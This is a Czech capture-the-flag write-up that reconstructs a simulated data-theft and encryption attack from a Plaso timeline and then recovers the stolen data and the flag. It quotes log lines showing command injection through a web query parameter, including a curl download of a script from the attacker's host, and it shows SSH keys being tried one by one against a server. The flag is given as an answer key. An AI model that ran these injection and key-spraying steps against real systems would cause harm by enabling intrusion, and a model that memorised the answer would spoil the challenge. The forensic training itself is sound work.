# Threatening message (4)

## Zadání

Hi, emergency troubleshooter,

hurry to the SSD (Support Services Department) – they’ve received a threatening e-mail, probably from a recently dismissed employee. It threatens both the loss and the disclosure of our organization’s data. The situation needs to be investigated.

Stay grounded!

* [Download threatening message](threatening_message.zip)
* [Download materials for analysis](image.zip)

## Nápovědy (Hints)

1. Beware! You may face the real malware in this challenge.

## Řešení

Stažená zpráva obsahuje informaci o zakódování a získání souborů ze systému a také `Your unique ID: X1F9-28AA-91BC`.

Ve druhém souboru je log z forenzního nástroje pro časovou analýzu digitálních stop Plaso <https://plaso.readthedocs.io>.

Nejdříve si vyexportujeme log do CSV nebo XLSX souboru

```text
psort image.plaso -w export.csv
psort image.plaso -w export.xlsx -o xls
```

Útok začíná v čase `2025-08-25 13:13:00,000` pokusy o vzdálené spuštění kódu (http_request: GET /get_user_by__iid?q=whoami HTTP/1.1 from: 10.99.25.28 code: 200 user_agent: curl/7.88.1) a končí v čase `2025-08-25 13:31:04,013` odpojením SSH.

Řádky, které nás budou zajímat jsou

```text
http_request: GET /get_user_by__iid?q=curl http://[2001:db8:7cc::25:28]/my/backup2 -o /tmp/backup.sh HTTP/1.1 from: 2001:db8:7cc::25:28 code: 200 user_agent: curl/7.88.1

[sudo] doublepower : TTY=pts/0 ; PWD=/home/doublepower ; USER=root ; COMMAND=/home/doublepower/sc encrypt /srv/shared /home/doublepower/enc

[sudo] doublepower : TTY=pts/0 ; PWD=/home/doublepower ; USER=root ; COMMAND=/usr/bin/tar -czf /home/doublepower/shared.tar.gz /srv/shared

[nfdump] FLOW TCP 2001:db8:7cc::25:252 34934 -> 2001:db8:7cc::25:29 22 Packets=37 Bytes=70304 Duration=0.419
```

Útočník si z PC `2001:db8:7cc::25:28` stáhl nějaký soubor, zahesloval soubory v adresáři `/srv/shared`, zabalil je do `shared.tar.gz` a přenesl ho pomocí SSh na `2001:db8:7cc::25:29`.

Proskenujeme PC útočníka

`nmap.exe -6 2001:db8:7cc::25:28`

```text
PORT   STATE SERVICE
80/tcp open  http
```

Na webové stránce PC je jen obrázek `Power²`. Zkusíme zjistit, jestli je tam ještě něco.

`ffuf -u http://[2001:db8:7cc::25:28]/FUZZ -w /usr/share/dirb/wordlists/common.txt`

```text
current                 [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 25ms]
index.html              [Status: 200, Size: 329, Words: 93, Lines: 19, Duration: 26ms]
keys                    [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 21ms]
ssh                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 32ms]
my                      [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 21ms]
tools                   [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 20ms]
```

Adresář `current` obsahuje soubory `read.me` ze dvou útoků, jeden je z našeho, ale soubor `shared.tar.gz` chybí.

Adresář `ssh` obsahuje 16 SSH klíčů.

Adresář `my` není vylistovaltelný, ale podle Plaso logu obsahuje soubor `backup2`.

Adresář `keys` obsahuje 512 RAS klíčů, jeden z nich byl použitý k zaheslování souborů.

Adresář `tools` není vylistovaltelný, ale obsahuje program `sc` použitý k zaheslování.

Postupně zkoušíme připojení pomocí SSH klíčů na server, kam útočník pravděpodobně nahrál zašifrovanou zálohu až najdeme ten správný.

`ssh -i id_doublepower_11 11@[2001:db8:7cc::25:29]`

Stáhneme si `shared.tar.gz`.

`scp -i id_doublepower_11 11@[2001:db8:7cc::25:29]:shared.tar.gz shared.tar.gz`

Dekryptovacích klíčů je hodně, tak si pomůžeme skriptem.

```sh
#!/bin/bash
tar axf shared.tar.gz

for key in *.pem; do
  ./sc decrypt srv "$key"

  rc=$?
  if [ "$rc" -eq 0 ]; then
    echo "Decrypt uspěl pro: $key"
    break
  fi
done
```

Dekódování uspěje s klíčem `key_140261531202.pem`.

V dekódovaných souborech je zajímavý `srv\shared\other\powerplant_selfdestruction.csv`, který obsahuje ve sloupcích Base64 data.

Hledaný FLAG je na řádce

`Horizon Nuclear   dGJVLVNmUmEtUWxKQ30=   QkFEQUZMQUd7bUtlay1F`

Po dekódování `tbU-SfRa-QlJC}` a `BADAFLAG{mKek-E`.

## Flag

`FLAG{mKek-EtbU-SfRa-QlJC}`
